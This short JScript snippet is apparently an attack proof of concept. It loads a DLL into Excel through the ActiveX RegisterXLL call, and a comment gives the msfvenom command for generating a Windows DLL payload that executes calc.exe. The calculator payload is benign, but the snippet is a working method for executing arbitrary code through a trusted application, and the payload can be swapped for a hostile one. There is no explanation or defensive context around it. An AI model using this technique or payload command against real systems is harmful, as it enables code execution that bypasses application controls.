var excel = new ActiveXObject("Excel.Application");
excel.RegisterXLL("d:\\wsf\\calc.dll");

//msfvenom -f dll -a x86 --platform windows -o d:/calc.dll -p windows/exec CMD=calc.exe